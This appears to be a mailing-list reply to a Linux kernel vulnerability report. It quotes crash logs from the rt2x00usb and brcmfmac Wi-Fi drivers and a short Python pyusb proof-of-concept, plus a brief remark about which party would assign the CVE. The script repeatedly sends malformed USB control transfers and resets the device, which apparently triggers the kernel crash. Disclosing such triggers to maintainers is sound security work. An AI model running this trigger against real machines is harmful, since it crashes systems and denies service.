> [  +0.000004]  __dev_change_flags+0x1b5/0x230
> [  +0.000003]  dev_change_flags+0x27/0x80
> [  +0.000003]  do_setlink+0x3a1/0xe60
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ? __nla_validate_parse+0x49/0x1e0
> [  +0.000004]  __rtnl_newlink+0x6e5/0x770
> [  +0.000005]  rtnl_newlink+0x48/0x80
> [  +0.000002]  rtnetlink_rcv_msg+0x170/0x430
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
> [  +0.000002]  netlink_rcv_skb+0x5d/0x110
> [  +0.000005]  rtnetlink_rcv+0x15/0x30
> [  +0.000002]  netlink_unicast+0x1b3/0x2a0
> [  +0.000003]  netlink_sendmsg+0x25e/0x4e0
> [  +0.000003]  ____sys_sendmsg+0x3ef/0x420
> [  +0.000002]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000004]  ___sys_sendmsg+0x9a/0xf0
> [  +0.000003]  ? kvfree+0x31/0x40
> [  +0.000004]  __sys_sendmsg+0x89/0xf0
> [  +0.000004]  __x64_sys_sendmsg+0x1d/0x30
> [  +0.000002]  x64_sys_call+0x114d/0x20b0
> [  +0.000002]  do_syscall_64+0x55/0x90
> [  +0.000001]  ? __rseq_handle_notify_resume+0x37/0x70
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? exit_to_user_mode_loop+0xe5/0x130
> [  +0.000002]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000001]  ? exit_to_user_mode_prepare+0x30/0xb0
> [  +0.000002]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? syscall_exit_to_user_mode+0x37/0x60
> [  +0.000002]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? do_syscall_64+0x61/0x90
> [  +0.000001]  ? do_syscall_64+0x61/0x90
> [  +0.000002]  entry_SYSCALL_64_after_hwframe+0x73/0xdd
> [  +0.000002] RIP: 0033:0x7bfb4872799d
> [  +0.000005] Code: 28 89 54 24 1c 48 89 74 24 10 89 7c 24 08 e8 6a 90 f6
> ff 8b 54 24 1c 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 2e 00 00 00 0f 05
> <48> 3d 00 f0 ff ff 77 33 44 89 c7 48 89 44 24 08 e8 ae 90 f6 ff 48
> [  +0.000002] RSP: 002b:00007ffd73cd3280 EFLAGS: 00000293 ORIG_RAX:
> 000000000000002e
> [  +0.000002] RAX: ffffffffffffffda RBX: 00000000000004a3 RCX:
> 00007bfb4872799d
> [  +0.000001] RDX: 0000000000000000 RSI: 00007ffd73cd32c0 RDI:
> 000000000000000c
> [  +0.000001] RBP: 000055d422a2e030 R08: 0000000000000000 R09:
> 0000000000000000
> [  +0.000001] R10: 0000000000000000 R11: 0000000000000293 R12:
> 0000000000000000
> [  +0.000001] R13: 00007ffd73cd3410 R14: 00007ffd73cd340c R15:
> 0000000000000000
> [  +0.000003]  </TASK>
> [  +0.000001] ---[ end trace 0000000000000000 ]---
> [  +0.000002] BUG: unable to handle page fault for address: 0000000000001=
1b0
> [  +0.000003] #PF: supervisor read access in kernel mode
> [  +0.000001] #PF: error_code(0x0000) - not-present page
> [  +0.000002] PGD 0 P4D 0
> [  +0.000003] Oops: 0000 [#1] PREEMPT SMP NOPTI
> [  +0.000002] CPU: 16 PID: 754 Comm: NetworkManager Tainted: G        W
>      6.5.0-41-generic #41~22.04.2-Ubuntu
> [  +0.000002] Hardware name: System manufacturer System Product Name/TUF
> GAMING X570-PLUS, BIOS 3603 03/20/2021
> [  +0.000001] RIP: 0010:rt2x00usb_clear_entry+0x5/0x40 [rt2x00usb]
> [  +0.000004] Code: d2 31 c9 31 f6 31 ff 45 31 c0 e9 e6 1a 90 e5 66 0f 1f
> 44 00 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f 1f 44 00 00
> <48> 8b 47 10 48 c7 07 00 00 00 00 83 78 10 0e 74 0b 31 c0 31 f6 31
> [  +0.000002] RSP: 0018:ffffb0fe4126f5e0 EFLAGS: 00010206
> [  +0.000002] RAX: ffffffffc20411f0 RBX: 000000000000005f RCX:
> 0000000000000000
> [  +0.000001] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> 00000000000011a0
> [  +0.000002] RBP: ffffb0fe4126f600 R08: 0000000000000000 R09:
> 0000000000000000
> [  +0.000001] R10: 0000000000000000 R11: 0000000000000000 R12:
> ffff919567fab4f0
> [  +0.000002] R13: ffff9198efd9e060 R14: ffff9198efd9c900 R15:
> ffff9196786a4000
> [  +0.000001] FS:  00007bfb476a34c0(0000) GS:ffff91a42ee00000(0000)
> knlGS:0000000000000000
> [  +0.000002] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  +0.000002] CR2: 00000000000011b0 CR3: 000000011e4ce000 CR4:
> 0000000000750ee0
> [  +0.000001] PKRU: 55555554
> [  +0.000001] Call Trace:
> [  +0.000002]  <TASK>
> [  +0.000001]  ? show_regs+0x6d/0x80
> [  +0.000003]  ? __die+0x24/0x80
> [  +0.000003]  ? page_fault_oops+0x99/0x1b0
> [  +0.000004]  ? do_user_addr_fault+0x31d/0x6b0
> [  +0.000003]  ? exc_page_fault+0x83/0x1b0
> [  +0.000003]  ? asm_exc_page_fault+0x27/0x30
> [  +0.000003]  ? __pfx_rt2x00usb_clear_entry+0x10/0x10 [rt2x00usb]
> [  +0.000004]  ? rt2x00usb_clear_entry+0x5/0x40 [rt2x00usb]
> [  +0.000005]  ? rt2x00queue_init_queues+0xa5/0x100 [rt2x00lib]
> [  +0.000005]  rt2x00lib_enable_radio+0x28/0xb0 [rt2x00lib]
> [  +0.000006]  rt2x00lib_start+0x87/0xd0 [rt2x00lib]
> [  +0.000005]  rt2x00mac_start+0x2d/0x80 [rt2x00lib]
> [  +0.000006]  drv_start+0x55/0x130 [mac80211]
> [  +0.000025]  ieee80211_do_open+0x353/0x7e0 [mac80211]
> [  +0.000028]  ieee80211_open+0x76/0xa0 [mac80211]
> [  +0.000027]  __dev_open+0x105/0x1d0
> [  +0.000004]  __dev_change_flags+0x1b5/0x230
> [  +0.000003]  dev_change_flags+0x27/0x80
> [  +0.000004]  do_setlink+0x3a1/0xe60
> [  +0.000004]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? __nla_validate_parse+0x49/0x1e0
> [  +0.000004]  __rtnl_newlink+0x6e5/0x770
> [  +0.000006]  rtnl_newlink+0x48/0x80
> [  +0.000003]  rtnetlink_rcv_msg+0x170/0x430
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
> [  +0.000003]  netlink_rcv_skb+0x5d/0x110
> [  +0.000005]  rtnetlink_rcv+0x15/0x30
> [  +0.000002]  netlink_unicast+0x1b3/0x2a0
> [  +0.000003]  netlink_sendmsg+0x25e/0x4e0
> [  +0.000004]  ____sys_sendmsg+0x3ef/0x420
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ___sys_sendmsg+0x9a/0xf0
> [  +0.000004]  ? kvfree+0x31/0x40
> [  +0.000005]  __sys_sendmsg+0x89/0xf0
> [  +0.000004]  __x64_sys_sendmsg+0x1d/0x30
> [  +0.000002]  x64_sys_call+0x114d/0x20b0
> [  +0.000002]  do_syscall_64+0x55/0x90
> [  +0.000002]  ? __rseq_handle_notify_resume+0x37/0x70
> [  +0.000003]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? exit_to_user_mode_loop+0xe5/0x130
> [  +0.000002]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ? exit_to_user_mode_prepare+0x30/0xb0
> [  +0.000002]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000002]  ? syscall_exit_to_user_mode+0x37/0x60
> [  +0.000002]  ? srso_alias_return_thunk+0x5/0x7f
> [  +0.000003]  ? do_syscall_64+0x61/0x90
> [  +0.000001]  ? do_syscall_64+0x61/0x90
> [  +0.000003]  entry_SYSCALL_64_after_hwframe+0x73/0xdd
> [  +0.000002] RIP: 0033:0x7bfb4872799d
> [  +0.000005] Code: 28 89 54 24 1c 48 89 74 24 10 89 7c 24 08 e8 6a 90 f6
> ff 8b 54 24 1c 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 2e 00 00 00 0f 05
> <48> 3d 00 f0 ff ff 77 33 44 89 c7 48 89 44 24 08 e8 ae 90 f6 ff 48
> [  +0.000001] RSP: 002b:00007ffd73cd3280 EFLAGS: 00000293 ORIG_RAX:
> 000000000000002e
> [  +0.000003] RAX: ffffffffffffffda RBX: 00000000000004a3 RCX:
> 00007bfb4872799d
> [  +0.000001] RDX: 0000000000000000 RSI: 00007ffd73cd32c0 RDI:
> 000000000000000c
> [  +0.000002] RBP: 000055d422a2e030 R08: 0000000000000000 R09:
> 0000000000000000
> [  +0.000001] R10: 0000000000000000 R11: 0000000000000293 R12:
> 0000000000000000
> [  +0.000001] R13: 00007ffd73cd3410 R14: 00007ffd73cd340c R15:
> 0000000000000000
> [  +0.000004]  </TASK>
> [  +0.000001] Modules linked in: rt2800usb rt2x00usb rt2800lib rt2x00lib
> tcp_diag inet_diag bnep nfnetlink_queue nfnetlink_log bluetooth
> ecdh_generic ecc usbmon nf_conntrack_netlink xfrm_user xfrm_algo
> xt_addrtype br_netfilter ccm xt_CHECKSUM xt_MASQUERADE xt_conntrack
> ipt_REJECT nf_reject_ipv4 xt_tcpudp nft_compat nft_chain_nat nf_nat
> nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4 nf_tables libcrc32c nfnetlink
> bridge stp llc overlay intel_rapl_msr intel_rapl_common
> snd_hda_codec_realtek snd_hda_codec_generic snd_hda_codec_hdmi
> snd_hda_intel snd_intel_dspcfg mt7921u mt76x2u snd_intel_sdw_acpi
> mt7921_common mt76x2_common edac_mce_amd amdgpu snd_hda_codec
> mt76_connac_lib mt76x02_usb mt76x02_lib mt76_usb snd_hda_core kvm_amd
> snd_hwdep mt76 binfmt_misc kvm snd_pcm irqbypass mac80211 crct10dif_pclmul
> snd_seq_midi amdxcp polyval_clmulni snd_seq_midi_event iommu_v2
> polyval_generic drm_buddy ghash_clmulni_intel sha256_ssse3 snd_rawmidi
> gpu_sched sha1_ssse3 drm_suballoc_helper aesni_intel drm_ttm_helper
> nls_iso8859_1 ttm crypto_simd
> [  +0.000056]  snd_seq cryptd cfg80211 drm_display_helper snd_seq_device
> snd_timer cec rapl rc_core joydev input_leds libarc4 drm_kms_helper
> eeepc_wmi snd wmi_bmof i2c_algo_bit k10temp soundcore ccp mac_hid
> sch_fq_codel msr parport_pc ppdev lp parport drm efi_pstore ip_tables
> x_tables autofs4 hid_logitech_hidpp hid_logitech_dj hid_generic usbhid hid
> mfd_aaeon asus_wmi video ledtrig_audio sparse_keymap platform_profile
> crc32_pclmul nvme ahci i2c_piix4 r8169 xhci_pci libahci nvme_core
> xhci_pci_renesas realtek nvme_common wmi
> [  +0.000037] CR2: 00000000000011b0
> [  +0.000002] ---[ end trace 0000000000000000 ]---
> [  +0.164871] RIP: 0010:rt2x00usb_clear_entry+0x5/0x40 [rt2x00usb]
> [  +0.000008] Code: d2 31 c9 31 f6 31 ff 45 31 c0 e9 e6 1a 90 e5 66 0f 1f
> 44 00 00 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f 1f 44 00 00
> <48> 8b 47 10 48 c7 07 00 00 00 00 83 78 10 0e 74 0b 31 c0 31 f6 31
> [  +0.000003] RSP: 0018:ffffb0fe4126f5e0 EFLAGS: 00010206
> [  +0.000003] RAX: ffffffffc20411f0 RBX: 000000000000005f RCX:
> 0000000000000000
> [  +0.000002] RDX: 0000000000000000 RSI: 0000000000000000 RDI:
> 00000000000011a0
> [  +0.000003] RBP: ffffb0fe4126f600 R08: 0000000000000000 R09:
> 0000000000000000
> [  +0.000002] R10: 0000000000000000 R11: 0000000000000000 R12:
> ffff919567fab4f0
> [  +0.000002] R13: ffff9198efd9e060 R14: ffff9198efd9c900 R15:
> ffff9196786a4000
> [  +0.000002] FS:  00007bfb476a34c0(0000) GS:ffff91a42ee00000(0000)
> knlGS:0000000000000000
> [  +0.000002] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  +0.000002] CR2: 00000000000011b0 CR3: 000000011e4ce000 CR4: 00000
>=20
>=20
>=20
> There is another point that we do not quite understand. We also triggered
> this vulnerability on a Broadcom network card. However, the kernel message
> indicated that the issue was due to the brcmfmac firmware. Using lsusb, we
> discovered that this chip also uses the rt2x00 chipset. Could you please
> clarify whether you can address this issue as well, or should we notify
> Broadcom?
>=20
> ----------------------------- Broadcom crash log"
>=20
> [ +0.709539] usb 3-1.4: reset high-speed USB device number 8 using xhci_h=
cd
> [ +0.133374] brcmfmac: brcmf_c_process_clm_blob: no clm_blob available
> (err=3D-2), device may have limited channels available
> [ +0.000007] brcmfmac: brcmf_c_process_txcap_blob: no txcap_blob available
> (err=3D-2)
> [ +0.000742] brcmfmac: brcmf_c_preinit_dcmds: Firmware: BCM43236/3 wl0: N=
ov
> 30 2011 17:33:42 version 5.90.188.22
> [ +0.056253] usb 3-1.4 wlxbc307eab1237: renamed from wlan0
> [ +0.024459] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000006] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.003143] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000003] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.000003] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000001] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.003414] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000004] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.013322] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000003] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.000047] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000002] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.001726] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000003] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.000053] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000002] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.005724] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000004] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.082551] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000007] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.002798] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000004] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.009268] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000005] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.037693] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000007] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.004651] ieee80211 phy33: brcmf_cfg80211_escan_handler: scan not read=
y,
> bsscfgidx=3D0
> [ +0.000004] ieee80211 phy33: brcmf_fweh_event_worker: event handler fail=
ed
> (69)
> [ +0.740682] usb 3-1.4: reset high-speed USB device number 8 using xhci_h=
cd
> [ +0.135285] brcmfmac: brcmf_c_process_clm_blob: no clm_blob available
> (err=3D-2), device may have limited channels available
> [ +0.000007] brcmfmac: brcmf_c_process_txcap_blob: no txcap_blob available
> (err=3D-2)
> [ +0.000741] brcmfmac: brcmf_c_preinit_dcmds: Firmware: BCM43236/3 wl0: N=
ov
> 30 2011 17:33:42 version 5.90.188.22
> [ +0.015434] BUG: kernel NULL pointer dereference, address: 0000000000000=
360
> [ +0.000004] #PF: supervisor read access in kernel mode
> [ +0.000002] #PF: error_code(0x0000) - not-present page
> [ +0.000003] PGD 0 P4D 0
> [ +0.000006] Oops: 0000 [#1] PREEMPT SMP NOPTI
> [ +0.000005] CPU: 0 PID: 19093 Comm: kworker/0:4 Tainted: G OE
> 6.5.0-41-generic #41~22.04.2-Ubuntu
> [ +0.000005] Hardware name: System manufacturer System Product Name/TUF
> GAMING X570-PLUS, BIOS 3603 03/20/2021
> [ +0.000003] Workqueue: events brcmf_fweh_event_worker [brcmfmac]
> [ +0.000024] RIP: 0010:brcmf_cfg80211_escan_handler+0x27/0x380 [brcmfmac]
> [ +0.000017] Code: 90 90 90 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 =
41
> 54 53 48 83 ec 20 4c 8b 17 44 8b 6e 08 4d 8b 72 20 41 83 fd 04 74 67 <49>
> 8b 86 60 03 00 00 48 89 fb a8 01 0f 84 b9 02 00 00 41 83 fd 08
> [ +0.000003] RSP: 0018:ffffb44e061fbd20 EFLAGS: 00010202
> [ +0.000003] RAX: 0000000000000000 RBX: ffff94582e9759c0 RCX:
> ffffb44e061fbde8
> [ +0.000003] RDX: ffff9456d574f450 RSI: ffffb44e061fbde8 RDI:
> ffff94582e9759c0
> [ +0.000002] RBP: ffffb44e061fbd68 R08: ffff9456d574f450 R09:
> 0000000000000000
> [ +0.000003] R10: ffff9458bce3c900 R11: 0000000000000000 R12:
> 0000000000000045
> [ +0.000002] R13: 0000000000000008 R14: 0000000000000000 R15:
> 0000000000000045
> [ +0.000003] FS: 0000000000000000(0000) GS:ffff9465aea00000(0000)
> knlGS:0000000000000000
> [ +0.000003] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [ +0.000002] CR2: 0000000000000360 CR3: 0000000210812000 CR4:
> 0000000000750ef0
> [ +0.000003] PKRU: 55555554
> [ +0.000002] Call Trace:
> [ +0.000003] <TASK>
> [ +0.000004] ? show_regs+0x6d/0x80
> [ +0.000007] ? __die+0x24/0x80
> [ +0.000005] ? page_fault_oops+0x99/0x1b0
> [ +0.000006] ? do_user_addr_fault+0x31d/0x6b0
> [ +0.000005] ? exc_page_fault+0x83/0x1b0
> [ +0.000006] ? asm_exc_page_fault+0x27/0x30
> [ +0.000008] ? brcmf_cfg80211_escan_handler+0x27/0x380 [brcmfmac]
> [ +0.000016] ? srso_alias_return_thunk+0x5/0x7f
> [ +0.000005] ? psi_group_change+0x230/0x570
> [ +0.000006] ? __pfx_brcmf_cfg80211_escan_handler+0x10/0x10 [brcmfmac]
> [ +0.000016] brcmf_fweh_call_event_handler+0x5c/0x110 [brcmfmac]
> [ +0.000018] brcmf_fweh_event_worker+0x89/0x320 [brcmfmac]
> [ +0.000016] ? raw_spin_rq_unlock+0x10/0x40
> [ +0.000004] ? srso_alias_return_thunk+0x5/0x7f
> [ +0.000004] ? finish_task_switch.isra.0+0x85/0x2a0
> [ +0.000006] process_one_work+0x240/0x450
> [ +0.000006] worker_thread+0x50/0x3f0
> [ +0.000004] ? srso_alias_return_thunk+0x5/0x7f
> [ +0.000005] ? __pfx_worker_thread+0x10/0x10
> [ +0.000004] kthread+0xf2/0x120
> [ +0.000005] ? __pfx_kthread+0x10/0x10
> [ +0.000004] ret_from_fork+0x47/0x70
> [ +0.000005] ? __pfx_kthread+0x10/0x10
> [ +0.000005] ret_from_fork_asm+0x1b/0x30
> [ +0.000007] </TASK>
> [ +0.000003] Modules linked in: brcmfmac_wcc brcmfmac brcmutil
> nf_conntrack_netlink xfrm_user xfrm_algo xt_addrtype br_netfilter
> xt_CHECKSUM xt_MASQUERADE xt_conntrack ipt_REJECT nf_reject_ipv4 xt_tcpudp
> nft_compat nft_chain_nat nf_nat nf_conntrack nf_defrag_ipv6 nf_defrag_ipv4
> vboxnetadp(OE) vboxnetflt(OE) vboxdrv(OE) nf_tables libcrc32c nfnetlink
> bridge stp llc overlay intel_rapl_msr intel_rapl_common
> snd_hda_codec_realtek rt2800usb snd_hda_codec_generic snd_hda_codec_hdmi
> rt2x00usb edac_mce_amd rt2800lib snd_hda_intel snd_intel_dspcfg rt2x00lib
> snd_intel_sdw_acpi kvm_amd snd_hda_codec amdgpu mac80211 snd_hda_core
> snd_hwdep kvm binfmt_misc snd_pcm irqbypass amdxcp crct10dif_pclmul
> snd_seq_midi iommu_v2 cfg80211 nls_iso8859_1 polyval_clmulni
> snd_seq_midi_event drm_buddy polyval_generic ghash_clmulni_intel libarc4
> input_leds joydev gpu_sched sha256_ssse3 snd_rawmidi sha1_ssse3
> drm_suballoc_helper drm_ttm_helper aesni_intel ttm crypto_simd snd_seq
> cryptd drm_display_helper snd_seq_device rapl snd_timer cec rc_core snd
> [ +0.000101] eeepc_wmi wmi_bmof drm_kms_helper k10temp i2c_algo_bit
> soundcore ccp mac_hid sch_fq_codel msr parport_pc ppdev lp parport drm
> efi_pstore ip_tables x_tables autofs4 hid_logitech_hidpp hid_logitech_dj
> hid_generic usbhid hid mfd_aaeon asus_wmi video ledtrig_audio sparse_keym=
ap
> platform_profile crc32_pclmul nvme ahci i2c_piix4 r8169 xhci_pci nvme_core
> libahci xhci_pci_renesas realtek nvme_common wmi
> [ +0.000053] CR2: 0000000000000360
> [ +0.000003] ---[ end trace 0000000000000000 ]---
> [ +0.289680] RIP: 0010:brcmf_cfg80211_escan_handler+0x27/0x380 [brcmfmac]
> [ +0.000044] Code: 90 90 90 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 =
41
> 54 53 48 83 ec 20 4c 8b 17 44 8b 6e 08 4d 8b 72 20 41 83 fd 04 74 67 <49>
> 8b 86 60 03 00 00 48 89 fb a8 01 0f 84 b9 02 00 00 41 83 fd 08
> [ +0.000005] RSP: 0018:ffffb44e061fbd20 EFLAGS: 00010202
> [ +0.000005] RAX: 0000000000000000 RBX: ffff94582e9759c0 RCX:
> ffffb44e061fbde8
> [ +0.000004] RDX: ffff9456d574f450 RSI: ffffb44e061fbde8 RDI:
> ffff94582e9759c0
> [ +0.000003] RBP: ffffb44e061fbd68 R08: ffff9456d574f450 R09:
> 0000000000000000
> [ +0.000003] R10: ffff9458bce3c900 R11: 0000000000000000 R12:
> 0000000000000045
> [ +0.000003] R13: 0000000000000008 R14: 0000000000000000 R15:
> 0000000000000045
> [ +0.000003] FS: 0000000000000000(0000) GS:ffff9465aea00000(0000)
> knlGS:0000000000000000
> [ +0.000004] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [ +0.000004] CR2: 0000000000000360 CR3: 0000000210812000 CR4:
> 0000000000750ef0
> [ +0.000003] PKRU: 55555554
> [ +0.000003] note: kworker/0:4[19093] exited with irqs disabled
> [ +0.036443] usb 3-1.4 wlxbc307eab1237: renamed from wlan0
> [ +0.726413] ieee80211 phy34: brcmf_fil_cmd_data: bus is down. we have
> nothing to do.
> [ +0.000010] ieee80211 phy34: brcmf_notify_escan_complete: Scan abort fai=
led
>=20
> Here is the final part of the translation, including your request for a C=
VE
> assignment:

_If_ Ubuntu is the upstream/supplier of this vulnerability, the
Canonical CNA can assign the CVE. Otherwise we will defer to
linux-wireless.

> import usb.core
> import usb.util
> import time
> import random
>=20
> dev =3D usb.core.find(idVendor=3D0x148f, idProduct=3D0x3572)
> if dev is None:
>     raise ValueError("Device not found")
>=20
>=20
> def send_ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_leng=
th):
>     try:
>         data =3D bytes([0xFF] * data_length)
>         print(
>             f"Sending: bmRequestType=3D{bmRequestType}, bRequest=3D{bRequ=
est}, wValue=3D{wValue}, wIndex=3D{wIndex}, data=3D{data}")
>         send =3D dev.ctrl_transfer(bmRequestType, bRequest, wValue, wInde=
x, data)
>     except Exception as e:
>         print(f"Error: {e}")
>=20
>=20
> requests =3D [
>     (0x00, 0x00, 0x0000, 0x0000, 1),
> ]
>=20
> for i in range(100):
>     for bmRequestType, bRequest, wValue, wIndex, data_length in requests:
>         send_ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_=
length)
>         time.sleep(0.1)
>         dev.reset()
>=20


--P6BFFi6uiqj4jpNB
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCgAdFiEE0ZC278nRi4l3b3GjszvZgG6FIMYFAmaslqMACgkQszvZgG6F
IMYVrw//Sbr3GuV2jhIFlB4wQS3tbJxgJJwvdcf6VDTbTHcSBhCa4CC+dKWpjI/Z
9kYSyBisFPEWLoaZ7UBtB2d8gbsGuIhJswz0vpckhNvJYNg71qVHLqdcKB1nJw7a
//AnnVtc04TIxdIrnHP+DBx/gFX7klyH8Lre9diZsZH2XgvlDu8A8YzMtH4Dzgj5
zi3xijNjP/YSMyNBHNw0IhaJm52JazvNvdYoNLKlRaIaQKoBIUFXv6w7f9oEMuOw
54gK+45yqWmIhcUE4Wjp3AjFccxahbyUNjXUeeIkkzYWpA+GHMTfQ0F8TC6sudzy
tcCmuC9OsCmyA0pjAZgsCpWMsIYgIgVV58juMq2PmV1472L5Eh0nt0JuapJCsOIL
srkmQnCPXz/mpKx408cYom8wnis+e2IiIF3LPwXv6GImFBrMAmxsGrzIqja9jTrg
TCKgHHj9z0ELCGpq0W6ZmHUYUkb42KEyVb9cS/PgAngordW1UhPLIpfWwjTOj2Zj
YNeVJV1oVoaQYKzWeZeU5JMhfsnlaba3ZVdpfLLiXOss81uXl+PtSkImsk3kmUos
4KTuiCnnU+fHc22kM+HboXYuNYBLvnIbKktVaF74w61l+duyimur+BZGVlUjeRJs
yqUJrwhTEFVPmPjf0uZtiVV9dE8xDKkFFVI9Et1dkrsZ/+NcY2g=
=6kq1
-----END PGP SIGNATURE-----

--P6BFFi6uiqj4jpNB--

